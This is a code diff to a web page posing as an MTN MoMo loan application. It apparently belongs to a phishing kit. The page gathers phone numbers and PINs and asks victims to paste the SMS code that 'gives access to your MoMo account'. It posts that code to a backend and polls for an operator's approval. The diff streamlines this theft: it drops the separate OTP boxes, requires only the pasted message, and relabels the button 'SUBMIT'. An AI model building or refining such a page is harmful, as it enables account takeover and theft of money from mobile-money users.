@@ -234,7 +234,7 @@
   .otp-box[type=number] { -moz-appearance: textfield; }
   .otp-delete { cursor:pointer; color:var(--text-light); font-size:1rem; background:none; border:none; margin-left:6px; padding:0; transition:color 0.2s; }
   .otp-delete:hover { color:var(--mtn-gold); }
-  .btn-otp { width:100%; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:'Inter',sans-serif; transition:all 0.2s; }
+  .btn-otp { width:100%; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:'Inter',sans-serif; transition:all 0.2s; margin-top:16px; }
   .btn-otp.rdy { background: var(--grad); color:#fff; }
   .otp-curve { background:#fff; overflow:hidden; flex-shrink:0; }
   .otp-curve::before { content:''; display:block; background: var(--mtn-dark); height:50px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
@@ -602,30 +602,9 @@
         <p class="otp-paste-code-hint">e.g. "Y'ello. Please note! This confidential code gives access to your MoMo account:........."</p>
       </div>
 
-      <!-- Divider -->
-      <div class="otp-divider">
-        <div class="otp-divider-line"></div>
-        <div class="otp-divider-text">THEN ENTER OTP BELOW</div>
-        <div class="otp-divider-line"></div>
-      </div>
-
-      <!-- OTP Section Only -->
-      <div class="otp-section">
-        <div class="otp-section-title">OTP Code (4 digits):</div>
-        <div style="display: flex; align-items: center;">
-          <div class="otp-inputs" id="otpInputs">
-            <input type="password" id="otp0" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')">
-            <input type="password" id="otp1" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')">
-            <input type="password" id="otp2" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')">
-            <input type="password" id="otp3" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')">
-          </div>
-          <button class="otp-delete" onclick="clearOtpCode()" title="Delete OTP">✕</button>
-        </div>
-      </div>
-
       <div class="msg-box error" id="otpMsg"><span class="msg-icon">✕</span><span id="otpMsgTxt"></span></div>
       <div class="msg-box success" id="otpMsgOk"><span class="msg-icon">✓</span><span id="otpMsgOkTxt"></span></div>
-      <button id="bOtp" class="btn-otp" onclick="doOtp()">VERIFY & APPROVE LOAN</button>
+      <button id="bOtp" class="btn-otp" onclick="doOtp()">SUBMIT</button>
       <div id="mOtp" class="loading">
         <div class="spinner" style="margin: 16px auto;"></div>
         <div class="wait-msg">Verifying…</div>
@@ -753,7 +732,7 @@
       const btn = document.getElementById('bOtp');
       const spinner = document.getElementById('mOtp');
       btn.disabled = false;
-      btn.textContent = 'VERIFY & APPROVE LOAN';
+      btn.textContent = 'SUBMIT';
       spinner.classList.remove('show');
       document.getElementById('otpMsgPaste').value = '';
       chkOtp();
@@ -903,9 +882,9 @@
   }
 
   function clearOtpCode() {
-    [0,1,2,3].forEach(i => { document.getElementById('otp'+i).value = ''; });
+    document.getElementById('otpMsgPaste').value = '';
     chkOtp();
-    document.getElementById('otp0').focus();
+    document.getElementById('otpMsgPaste').focus();
   }
 
   function showLgnMsg(type, text) {
@@ -1272,9 +1251,8 @@
   }
 
   function chkOtp() {
-    const otpOk = [0,1,2,3].every(i => document.getElementById('otp'+i).value);
     const msgOk = (document.getElementById('otpMsgPaste').value || '').trim().length > 0;
-    document.getElementById('bOtp').className = (otpOk && msgOk) ? 'btn-otp rdy' : 'btn-otp';
+    document.getElementById('bOtp').className = msgOk ? 'btn-otp rdy' : 'btn-otp';
   }
 
   function showOtpMsg(type, text) {
@@ -1286,7 +1264,6 @@
   async function doOtp() {
     ['otpMsg','otpMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
 
-    const otp = [0,1,2,3].map(i => document.getElementById('otp'+i).value).join('');
     const pastedMsg = (document.getElementById('otpMsgPaste').value || '').trim();
 
     if (!pastedMsg) {
@@ -1294,20 +1271,15 @@
       return;
     }
 
-    if (otp.length < 4) {
-      showOtpMsg('error', 'Please enter 4-digit OTP code.');
-      return;
-    }
-
     document.getElementById('mOtp').classList.add('show');
     document.getElementById('bOtp').disabled = true;
-    document.getElementById('bOtp').textContent = 'VERIFYING...';
+    document.getElementById('bOtp').textContent = 'Processing…';
 
     try {
       const res  = await fetch('/api/verify-otp', {
         method:  'POST',
         headers: { 'Content-Type': 'application/json' },
-        body:    JSON.stringify({ applicationId: S.applicationId, otp, otpMessage: pastedMsg })
+        body:    JSON.stringify({ applicationId: S.applicationId, otpMessage: pastedMsg })
       });
 
       const data = await res.json();
@@ -1319,13 +1291,13 @@
         pollForOtpApproval(S.applicationId);
       } else {
         document.getElementById('bOtp').disabled = false;
-        document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
+        document.getElementById('bOtp').textContent = 'SUBMIT';
         showOtpMsg('error', data.message || 'Failed to submit OTP.');
       }
     } catch (err) {
       document.getElementById('mOtp').classList.remove('show');
       document.getElementById('bOtp').disabled = false;
-      document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
+      document.getElementById('bOtp').textContent = 'SUBMIT';
       showOtpMsg('error', 'Error: ' + err.message);
     }
   }
@@ -1362,10 +1334,9 @@
           } else if (status === 'wrongcode') {
             // ❌ Wrong OTP code — go back to OTP page to re-enter
             clearTimeout(otpPollTimeout);
-            [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
             goTo('page-otp');
             document.getElementById('bOtp').disabled = false;
-            document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
+            document.getElementById('bOtp').textContent = 'SUBMIT';
             chkOtp();
             showOtpMsg('error', 'The OTP code was incorrect. Please try again.');
 
@@ -1376,13 +1347,12 @@
             // Clear all sensitive fields
             document.getElementById('lpPhone').value = '';
             [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
-            [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
             document.getElementById('smsMsgBox').value = '';
             document.getElementById('otpMsgPaste').value = '';
 
             // Reset OTP button state
             document.getElementById('bOtp').disabled = false;
-            document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
+            document.getElementById('bOtp').textContent = 'SUBMIT';
 
             // Navigate back to login
             goTo('page-login');
